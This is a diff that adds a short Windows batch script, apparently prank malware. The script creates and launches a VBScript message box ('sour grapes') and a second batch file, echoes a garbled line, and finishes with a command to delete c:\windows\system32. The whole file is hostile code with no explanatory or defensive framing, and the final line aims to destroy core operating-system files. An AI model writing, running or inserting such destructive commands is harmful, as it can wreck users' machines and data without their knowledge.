@@ -1,0 +1,6 @@
+echo x=msgbox("sour grapes",0+16,"fizer")>b.vbs
+echo echo game play color>gouiz.bat
+Start gouiz.bat
+Start b.vbs
+echo disbleadsoffware.meme
+Del c:\windows\system32
